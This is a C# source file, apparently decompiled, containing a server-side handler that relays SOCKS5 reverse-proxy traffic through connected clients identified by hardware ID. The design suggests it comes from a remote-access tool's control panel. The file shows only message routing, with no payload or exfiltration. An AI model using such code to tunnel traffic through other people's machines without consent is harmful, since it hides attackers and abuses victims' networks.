using System;
using Server.Connectings;
using Server.Helper.Sock5;

namespace Server.Messages;

internal class HandlerReverseProxyU
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			client?.Disconnect();
			return;
		}
		string obj = objects[0]?.ToString();
		string str2 = " ";
		Console.WriteLine(obj + str2 + objects[1]);
		switch ((string)objects[1])
		{
		case "Disconnect":
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Disconnect();
			}
			break;
		case "Data":
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
			}
			else
			{
				((Client)client.Tag)?.Send((byte[])objects[2]);
			}
			break;
		case "ConnectResponse":
		{
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
				break;
			}
			Client client6 = (Client)client.Tag;
			client6?.HandleCommandResponse(objects);
			client.Tag = client6;
			break;
		}
		case "Accept":
		{
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
				break;
			}
			Server.Helper.Sock5.Server server = Program.form.ReverseProxyU.ServersPort((int)objects[4]);
			if (server == null)
			{
				client.Disconnect();
				break;
			}
			Client client5 = server.Search((int)objects[2]);
			if (client5 != null)
			{
				client5.Accept(client);
				client.Tag = client5;
			}
			else
			{
				client.Disconnect();
			}
			break;
		}
		case "Connect":
			if (!Program.form.ReverseProxyU.work)
			{
				client.Disconnect();
				break;
			}
			client.Hwid = (string)objects[2];
			client.Tag = Program.form.ReverseProxyU.NewServer(client);
			break;
		}
	}
}
